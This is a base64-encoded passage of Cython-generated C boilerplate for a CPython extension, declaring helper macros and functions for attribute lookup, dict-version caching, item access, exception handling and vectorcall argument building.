ICpjb25zdCAqYXJncywgUHlfc3NpemVfdCBuYXJncywgUHlPYmplY3QgKmt3YXJncyk7CiNlbmRpZgojZGVmaW5lIF9fUHl4X0JVSUxEX0FTU0VSVF9FWFBSKGNvbmQpXAogICAgKHNpemVvZihjaGFyIFsxIC0gMiohKGNvbmQpXSkgLSAxKQojaWZuZGVmIFB5X01FTUJFUl9TSVpFCiNkZWZpbmUgUHlfTUVNQkVSX1NJWkUodHlwZSwgbWVtYmVyKSBzaXplb2YoKCh0eXBlICopMCktPm1lbWJlcikKI2VuZGlmCiNpZiAhQ1lUSE9OX1ZFQ1RPUkNBTEwKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwMDAKICAjaW5jbHVkZSAiZnJhbWVvYmplY3QuaCIKICAjZGVmaW5lIF9fUHh5X1B5RnJhbWVfSW5pdGlhbGl6ZV9PZmZzZXRzKCkKICAjZGVmaW5lIF9fUHl4X1B5RnJhbWVfR2V0TG9jYWxzcGx1cyhmcmFtZSkgICgoZnJhbWUpLT5mX2xvY2Fsc3BsdXMpCiNlbHNlCiAgc3RhdGljIHNpemVfdCBfX3B5eF9weWZyYW1lX2xvY2Fsc3BsdXNfb2Zmc2V0ID0gMDsKICAjaW5jbHVkZSAiZnJhbWVvYmplY3QuaCIKICAjZGVmaW5lIF9fUHh5X1B5RnJhbWVfSW5pdGlhbGl6ZV9PZmZzZXRzKClcCiAgICAoKHZvaWQpX19QeXhfQlVJTERfQVNTRVJUX0VYUFIoc2l6ZW9mKFB5RnJhbWVPYmplY3QpID09IG9mZnNldG9mKFB5RnJhbWVPYmplY3QsIGZfbG9jYWxzcGx1cykgKyBQeV9NRU1CRVJfU0laRShQeUZyYW1lT2JqZWN0LCBmX2xvY2Fsc3BsdXMpKSxcCiAgICAgKHZvaWQpKF9fcHl4X3B5ZnJhbWVfbG9jYWxzcGx1c19vZmZzZXQgPSAoKHNpemVfdClQeUZyYW1lX1R5cGUudHBfYmFzaWNzaXplKSAtIFB5X01FTUJFUl9TSVpFKFB5RnJhbWVPYmplY3QsIGZfbG9jYWxzcGx1cykpKQogICNkZWZpbmUgX19QeXhfUHlGcmFtZV9HZXRMb2NhbHNwbHVzKGZyYW1lKVwKICAgIChhc3NlcnQoX19weXhfcHlmcmFtZV9sb2NhbHNwbHVzX29mZnNldCksIChQeU9iamVjdCAqKikoKChjaGFyICopKGZyYW1lKSkgKyBfX3B5eF9weWZyYW1lX2xvY2Fsc3BsdXNfb2Zmc2V0KSkKI2VuZGlmCiNlbmRpZgojZW5kaWYKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJnLCBQeU9iamVjdCAqa3cpOwojZWxzZQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0NhbGwoZnVuYywgYXJnLCBrdykgUHlPYmplY3RfQ2FsbChmdW5jLCBhcmcsIGt3KQojZW5kaWYKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aE8oUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcpOwojZW5kaWYKCgojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKGZ1bmMsIGFyZ3MsIG5hcmdzKSAgX19QeXhfUHlPYmplY3RfRmFzdENhbGxEaWN0KGZ1bmMsIGFyZ3MsIChzaXplX3QpKG5hcmdzKSwgTlVMTCkKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKiBjb25zdCphcmdzLCBzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd2FyZ3MpOwoKCnR5cGVkZWYgc3RydWN0IHsKICAgIFB5T2JqZWN0ICp0eXBlOwogICAgUHlPYmplY3QgKiptZXRob2RfbmFtZTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HICYmIENZVEhPTl9BVE9NSUNTCiAgICBfX3B5eF9hdG9taWNfaW50X3R5cGUgaW5pdGlhbGl6ZWQ7CiNlbmRpZgogICAgUHlDRnVuY3Rpb24gZnVuYzsKICAgIFB5T2JqZWN0ICptZXRob2Q7CiAgICBpbnQgZmxhZzsKfSBfX1B5eF9DYWNoZWRDRnVuY3Rpb247CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uX0dldEFuZFNldEluaXRpYWxpemluZyhfX1B5eF9DYWNoZWRDRnVuY3Rpb24gKmNmdW5jKSB7CiNpZiAhQ1lUSE9OX0FUT01JQ1MKICAgIHJldHVybiAxOwojZWxzZQogICAgX19weXhfbm9uYXRvbWljX2ludF90eXBlIGV4cGVjdGVkID0gMDsKICAgIGlmIChfX3B5eF9hdG9taWNfaW50X2NtcF9leGNoYW5nZSgmY2Z1bmMtPmluaXRpYWxpemVkLCAmZXhwZWN0ZWQsIDEpKSB7CiAgICAgICAgcmV0dXJuIDA7CiAgICB9CiAgICByZXR1cm4gZXhwZWN0ZWQ7CiNlbmRpZgp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uX1NldEZpbmlzaGVkSW5pdGlhbGl6aW5nKF9fUHl4X0NhY2hlZENGdW5jdGlvbiAqY2Z1bmMpIHsKI2lmIENZVEhPTl9BVE9NSUNTCiAgICBfX3B5eF9hdG9taWNfc3RvcmUoJmNmdW5jLT5pbml0aWFsaXplZCwgMik7CiNlbmRpZgp9CiNlbHNlCiNkZWZpbmUgX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uX0dldEFuZFNldEluaXRpYWxpemluZyhjZnVuYykgMgojZGVmaW5lIF9fUHl4X0NhY2hlZENGdW5jdGlvbl9TZXRGaW5pc2hlZEluaXRpYWxpemluZyhjZnVuYykKI2VuZGlmCgoKQ1lUSE9OX1VOVVNFRApzdGF0aWMgUHlPYmplY3QqIF9fUHl4X19DYWxsVW5ib3VuZENNZXRob2QyKF9fUHl4X0NhY2hlZENGdW5jdGlvbiogY2Z1bmMsIFB5T2JqZWN0KiBzZWxmLCBQeU9iamVjdCogYXJnMSwgUHlPYmplY3QqIGFyZzIpOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9DYWxsVW5ib3VuZENNZXRob2QyKF9fUHl4X0NhY2hlZENGdW5jdGlvbiAqY2Z1bmMsIFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJnMSwgUHlPYmplY3QgKmFyZzIpOwojZWxzZQojZGVmaW5lIF9fUHl4X0NhbGxVbmJvdW5kQ01ldGhvZDIoY2Z1bmMsIHNlbGYsIGFyZzEsIGFyZzIpICBfX1B5eF9fQ2FsbFVuYm91bmRDTWV0aG9kMihjZnVuYywgc2VsZiwgYXJnMSwgYXJnMikKI2VuZGlmCgoKc3RhdGljIHZvaWQgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoY29uc3QgY2hhciogZnVuY19uYW1lLCBpbnQgZXhhY3QsCiAgICBQeV9zc2l6ZV90IG51bV9taW4sIFB5X3NzaXplX3QgbnVtX21heCwgUHlfc3NpemVfdCBudW1fZm91bmQpOwoKCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMGQwMDAwCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRGVsQXR0cihvLCBuKSBQeU9iamVjdF9TZXRBdHRyKG8sIG4sIE5VTEwpCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRGVsQXR0cihvLCBuKSBQeU9iamVjdF9EZWxBdHRyKG8sIG4pCiNlbmRpZgoKCiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9EZWxBdHRyU3RyKG8sbikgX19QeXhfUHlPYmplY3RfU2V0QXR0clN0cihvLCBuLCBOVUxMKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlPYmplY3RfU2V0QXR0clN0cihQeU9iamVjdCogb2JqLCBQeU9iamVjdCogYXR0cl9uYW1lLCBQeU9iamVjdCogdmFsdWUpOwojZWxzZQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0RlbEF0dHJTdHIobyxuKSAgIF9fUHl4X1B5T2JqZWN0X0RlbEF0dHIobyxuKQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X1NldEF0dHJTdHIobyxuLHYpIFB5T2JqZWN0X1NldEF0dHIobyxuLHYpCiNlbmRpZgoKCiNpZiBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgJiYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiNkZWZpbmUgX19QWVhfRElDVF9WRVJTSU9OX0lOSVQgICgoUFlfVUlOVDY0X1QpIC0xKQojZGVmaW5lIF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oZGljdCkgICgoKFB5RGljdE9iamVjdCopKGRpY3QpKS0+bWFfdmVyc2lvbl90YWcpCiNkZWZpbmUgX19QWVhfVVBEQVRFX0RJQ1RfQ0FDSEUoZGljdCwgdmFsdWUsIGNhY2hlX3ZhciwgdmVyc2lvbl92YXIpXAogICAgKHZlcnNpb25fdmFyKSA9IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oZGljdCk7XAogICAgKGNhY2hlX3ZhcikgPSAodmFsdWUpOwojZGVmaW5lIF9fUFlYX1BZX0RJQ1RfTE9PS1VQX0lGX01PRElGSUVEKFZBUiwgRElDVCwgTE9PS1VQKSB7XAogICAgc3RhdGljIFBZX1VJTlQ2NF9UIF9fcHl4X2RpY3RfdmVyc2lvbiA9IDA7XAogICAgc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSA9IE5VTEw7XAogICAgaWYgKGxpa2VseShfX1BZWF9HRVRfRElDVF9WRVJTSU9OKERJQ1QpID09IF9fcHl4X2RpY3RfdmVyc2lvbikpIHtcCiAgICAgICAgKFZBUikgPSBfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZTtcCiAgICB9IGVsc2Uge1wKICAgICAgICAoVkFSKSA9IF9fcHl4X2RpY3RfY2FjaGVkX3ZhbHVlID0gKExPT0tVUCk7XAogICAgICAgIF9fcHl4X2RpY3RfdmVyc2lvbiA9IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oRElDVCk7XAogICAgfVwKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQWV9VSU5UNjRfVCBfX1B5eF9nZXRfdHBfZGljdF92ZXJzaW9uKFB5T2JqZWN0ICpvYmopOwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQWV9VSU5UNjRfVCBfX1B5eF9nZXRfb2JqZWN0X2RpY3RfdmVyc2lvbihQeU9iamVjdCAqb2JqKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X29iamVjdF9kaWN0X3ZlcnNpb25fbWF0Y2hlcyhQeU9iamVjdCogb2JqLCBQWV9VSU5UNjRfVCB0cF9kaWN0X3ZlcnNpb24sIFBZX1VJTlQ2NF9UIG9ial9kaWN0X3ZlcnNpb24pOwojZWxzZQojZGVmaW5lIF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oZGljdCkgICgwKQojZGVmaW5lIF9fUFlYX1VQREFURV9ESUNUX0NBQ0hFKGRpY3QsIHZhbHVlLCBjYWNoZV92YXIsIHZlcnNpb25fdmFyKQojZGVmaW5lIF9fUFlYX1BZX0RJQ1RfTE9PS1VQX0lGX01PRElGSUVEKFZBUiwgRElDVCwgTE9PS1VQKSAgKFZBUikgPSAoTE9PS1VQKTsKI2VuZGlmCgoKI2lmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUwojZGVmaW5lIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUodmFyLCBuYW1lKSAgZG8ge1wKICAgIHN0YXRpYyBQWV9VSU5UNjRfVCBfX3B5eF9kaWN0X3ZlcnNpb24gPSAwO1wKICAgIHN0YXRpYyBQeU9iamVjdCAqX19weXhfZGljdF9jYWNoZWRfdmFsdWUgPSBOVUxMO1wKICAgICh2YXIpID0gKGxpa2VseShfX3B5eF9kaWN0X3ZlcnNpb24gPT0gX19QWVhfR0VUX0RJQ1RfVkVSU0lPTihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kKSkpID9cCiAgICAgICAgKGxpa2VseShfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSkgPyBfX1B5eF9OZXdSZWYoX19weXhfZGljdF9jYWNoZWRfdmFsdWUpIDogX19QeXhfR2V0QnVpbHRpbk5hbWUobmFtZSkpIDpcCiAgICAgICAgX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUobmFtZSwgJl9fcHl4X2RpY3RfdmVyc2lvbiwgJl9fcHl4X2RpY3RfY2FjaGVkX3ZhbHVlKTtcCn0gd2hpbGUoMCkKI2RlZmluZSBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lVW5jYWNoZWQodmFyLCBuYW1lKSAgZG8ge1wKICAgIFBZX1VJTlQ2NF9UIF9fcHl4X2RpY3RfdmVyc2lvbjtcCiAgICBQeU9iamVjdCAqX19weXhfZGljdF9jYWNoZWRfdmFsdWU7XAogICAgKHZhcikgPSBfX1B5eF9fR2V0TW9kdWxlR2xvYmFsTmFtZShuYW1lLCAmX19weXhfZGljdF92ZXJzaW9uLCAmX19weXhfZGljdF9jYWNoZWRfdmFsdWUpO1wKfSB3aGlsZSgwKQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKFB5T2JqZWN0ICpuYW1lLCBQWV9VSU5UNjRfVCAqZGljdF92ZXJzaW9uLCBQeU9iamVjdCAqKmRpY3RfY2FjaGVkX3ZhbHVlKTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKHZhciwgbmFtZSkgICh2YXIpID0gX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUobmFtZSkKI2RlZmluZSBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lVW5jYWNoZWQodmFyLCBuYW1lKSAgKHZhcikgPSBfX1B5eF9fR2V0TW9kdWxlR2xvYmFsTmFtZShuYW1lKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUoUHlPYmplY3QgKm5hbWUpOwojZW5kaWYKCgojaWYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQICYmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWxOb0Vycm9yKG9iaiwgYXR0cl9uYW1lKSAgX19QeXhfX1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwob2JqLCBhdHRyX25hbWUsIDApCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChvYmosIGF0dHJfbmFtZSkgIF9fUHl4X19QeU9iamVjdF9Mb29rdXBTcGVjaWFsKG9iaiwgYXR0cl9uYW1lLCAxKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfX1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGF0dHJfbmFtZSwgaW50IHdpdGhfZXJyb3IpOwojZWxzZQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWxOb0Vycm9yKG8sbikgX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IobyxuKQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwobyxuKSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKG8sbikKI2VuZGlmCgoKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TG9uZ19BZGRPYmpDKFB5T2JqZWN0ICpvcDEsIFB5T2JqZWN0ICpvcDIsIGxvbmcgaW50dmFsLCBpbnQgaW5wbGFjZSwgaW50IHplcm9kaXZpc2lvbl9jaGVjayk7CiNlbHNlCiNkZWZpbmUgX19QeXhfUHlMb25nX0FkZE9iakMob3AxLCBvcDIsIGludHZhbCwgaW5wbGFjZSwgemVyb2RpdmlzaW9uX2NoZWNrKVwKICAgIChpbnBsYWNlID8gUHlOdW1iZXJfSW5QbGFjZUFkZChvcDEsIG9wMikgOiBQeU51bWJlcl9BZGQob3AxLCBvcDIpKQojZW5kaWYKCgojZGVmaW5lIF9fUHl4X0dldEl0ZW1JbnQobywgaSwgdHlwZSwgaXNfc2lnbmVkLCB0b19weV9mdW5jLCBpc19saXN0LCB3cmFwYXJvdW5kLCBib3VuZHNjaGVjaywgaGFzX2dpbClcCiAgICAoX19QeXhfZml0c19QeV9zc2l6ZV90KGksIHR5cGUsIGlzX3NpZ25lZCkgP1wKICAgIF9fUHl4X0dldEl0ZW1JbnRfRmFzdChvLCAoUHlfc3NpemVfdClpLCBpc19saXN0LCB3cmFwYXJvdW5kLCBib3VuZHNjaGVjaykgOlwKICAgIChpc19saXN0ID8gKFB5RXJyX1NldFN0cmluZyhQeUV4Y19JbmRleEVycm9yLCAibGlzdCBpbmRleCBvdXQgb2YgcmFuZ2UiKSwgKFB5T2JqZWN0KilOVUxMKSA6XAogICAgICAgICAgICAgICBfX1B5eF9HZXRJdGVtSW50X0dlbmVyaWMobywgdG9fcHlfZnVuYyhpKSkpKQojZGVmaW5lIF9fUHl4X0dldEl0ZW1JbnRfTGlzdChvLCBpLCB0eXBlLCBpc19zaWduZWQsIHRvX3B5X2Z1bmMsIGlzX2xpc3QsIHdyYXBhcm91bmQsIGJvdW5kc2NoZWNrLCBoYXNfZ2lsKVwKICAgIChfX1B5eF9maXRzX1B5X3NzaXplX3QoaSwgdHlwZSwgaXNfc2lnbmVkKSA/XAogICAgX19QeXhfR2V0SXRlbUludF9MaXN0X0Zhc3QobywgKFB5X3NzaXplX3QpaSwgd3JhcGFyb3VuZCwgYm91bmRzY2hlY2spIDpcCiAgICAoUHlFcnJfU2V0U3RyaW5nKFB5RXhjX0luZGV4RXJyb3IsICJsaXN0IGluZGV4IG91dCBvZiByYW5nZSIpLCAoUHlPYmplY3QqKU5VTEwpKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfR2V0SXRlbUludF9MaXN0X0Zhc3QoUHlPYmplY3QgKm8sIFB5X3NzaXplX3QgaSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgd3JhcGFyb3VuZCwgaW50IGJvdW5kc2NoZWNrKTsKI2RlZmluZSBfX1B5eF9HZXRJdGVtSW50X1R1cGxlKG8sIGksIHR5cGUsIGlzX3NpZ25lZCwgdG9fcHlfZnVuYywgaXNfbGlzdCwgd3JhcGFyb3VuZCwgYm91bmRzY2hlY2ssIGhhc19naWwpXAogICAgKF9fUHl4X2ZpdHNfUHlfc3NpemVfdChpLCB0eXBlLCBpc19zaWduZWQpID9cCiAgICBfX1B5eF9HZXRJdGVtSW50X1R1cGxlX0Zhc3QobywgKFB5X3NzaXplX3QpaSwgd3JhcGFyb3VuZCwgYm91bmRzY2hlY2spIDpcCiAgICAoUHlFcnJfU2V0U3RyaW5nKFB5RXhjX0luZGV4RXJyb3IsICJ0dXBsZSBpbmRleCBvdXQgb2YgcmFuZ2UiKSwgKFB5T2JqZWN0KilOVUxMKSkKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0dldEl0ZW1JbnRfVHVwbGVfRmFzdChQeU9iamVjdCAqbywgUHlfc3NpemVfdCBpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCB3cmFwYXJvdW5kLCBpbnQgYm91bmRzY2hlY2spOwpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldEl0ZW1JbnRfR2VuZXJpYyhQeU9iamVjdCAqbywgUHlPYmplY3QqIGopOwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfR2V0SXRlbUludF9GYXN0KFB5T2JqZWN0ICpvLCBQeV9zc2l6ZV90IGksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGlzX2xpc3QsIGludCB3cmFwYXJvdW5kLCBpbnQgYm91bmRzY2hlY2spOwoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJnKTsKCgojaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeU9iamVjdF9HZXRJdGVtKFB5T2JqZWN0ICpvYmosIFB5T2JqZWN0ICprZXkpOwojZWxzZQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0dldEl0ZW0ob2JqLCBrZXkpICBQeU9iamVjdF9HZXRJdGVtKG9iaiwga2V5KQojZW5kaWYKCgojaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSyAmJiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKc3RhdGljIF9QeUVycl9TdGFja0l0ZW0gKiBfX1B5eF9QeUVycl9HZXRUb3Btb3N0RXhjZXB0aW9uKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSk7CiNlbmRpZgoKCiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKI2RlZmluZSBfX1B5eF9FeGNlcHRpb25TYXZlKHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X19FeGNlcHRpb25TYXZlKF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19FeGNlcHRpb25TYXZlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKTsKI2RlZmluZSBfX1B5eF9FeGNlcHRpb25SZXNldCh0eXBlLCB2YWx1ZSwgdGIpICBfX1B5eF9fRXhjZXB0aW9uUmVzZXQoX19weXhfdHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfX0V4Y2VwdGlvblJlc2V0KFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKnR5cGUsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKnRiKTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9FeGNlcHRpb25TYXZlKHR5cGUsIHZhbHVlLCB0YikgICBQeUVycl9HZXRFeGNJbmZvKHR5cGUsIHZhbHVlLCB0YikKI2RlZmluZSBfX1B5eF9FeGNlcHRpb25SZXNldCh0eXBlLCB2YWx1ZSwgdGIpICBQeUVycl9TZXRFeGNJbmZvKHR5cGUsIHZhbHVlLCB0YikKI2VuZGlmCgoKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQojZGVmaW5lIF9fUHl4X0dldEV4Y2VwdGlvbih0eXBlLCB2YWx1ZSwgdGIpICBfX1B5eF9fR2V0RXhjZXB0aW9uKF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKQpzdGF0aWMgaW50IF9fUHl4X19HZXRFeGNlcHRpb24oUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpOwojZWxzZQpzdGF0aWMgaW50IF9fUHl4X0dldEV4Y2VwdGlvbihQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpOwojZW5kaWYKCgpzdGF0aWMgdm9pZCBfX1B5eF9SYWlzZVVuYm91bmRMb2NhbEVycm9yKGNvbnN0IGNoYXIgKnZhcm5hbWUpOwoKCiNpZiBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfTGlzdENvbXBfQXBwZW5kKFB5T2JqZWN0KiBsaXN0LCBQeU9iamVjdCogeCkgewogICAgUHlMaXN0T2JqZWN0KiBMID0gKFB5TGlzdE9iamVjdCopIGxpc3Q7CiAgICBQeV9zc2l6ZV90IGxlbiA9IFB5X1NJWkUobGlzdCk7CiAgICBpZiAobGlrZWx5KEwtPmFsbG9jYXRlZCA+IGxlbikpIHsKICAgICAgICBQeV9JTkNSRUYoeCk7CiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwCiAgICAgICAgTC0+b2JfaXRlbVtsZW5dID0geDsKICAgICAgICAjZWxzZQogICAgICAgIFB5TGlzdF9TRVRfSVRFTShsaXN0LCBsZW4sIHgpOwogICAgICAgICNlbmRpZgogICAgICAgIF9fUHl4X1NFVF9TSVpFKGxpc3QsIGxlbiArIDEpOwogICAgICAgIHJldHVybiAwOwogICAgfQogICAgcmV0dXJuIFB5TGlzdF9BcHBlbmQobGlzdCwgeCk7Cn0KI2Vsc2UKI2RlZmluZSBfX1B5eF9MaXN0Q29tcF9BcHBlbmQoTCx4KSBQeUxpc3RfQXBwZW5kKEwseCkKI2VuZGlmCgoKc3RhdGljIHZvaWQgX19QeXhfUmFpc2VDbG9zdXJlTmFtZUVycm9yKGNvbnN0IGNoYXIgKnZhcm5hbWUpOwoKCnN0YXRpYyB2b2lkIF9fUHl4X0dlbmVyYXRvcl9SZXBsYWNlX1N0b3BJdGVyYXRpb24oaW50IGluX2FzeW5jX2dlbik7CgoKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKG9iailcCiAgICAobGlrZWx5KFB5VW5pY29kZV9DaGVja0V4YWN0KG9iaikpID8gX19QeXhfTmV3UmVmKG9iaikgOiBQeU9iamVjdF9TdHIob2JqKSkKCgpDWVRIT05fVU5VU0VEIHN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnX0NoZWNrKFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pOwojaWYgQ1lUSE9OX1ZFQ1RPUkNBTEwKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAKI2RlZmluZSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIgUHlPYmplY3RfVmVjdG9yY2FsbAojZWxzZQojZGVmaW5lIF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlciBfUHlPYmplY3RfVmVjdG9yY2FsbAojZW5kaWYKI2RlZmluZSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKG4pIFB5VHVwbGVfTmV3KG4pCnN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pOwpzdGF0aWMgaW50IF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ1N0cihjb25zdCBjaGFyICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pOwojZWxzZQojZGVmaW5lIF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlciBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbERpY3QKI2RlZmluZSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKG4pIF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZChuKQojZGVmaW5lIF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhrZXksIHZhbHVlLCBidWlsZGVyLCBhcmdzLCBuKSBQeURpY3RfU2V0SXRlbShidWlsZGVyLCBrZXk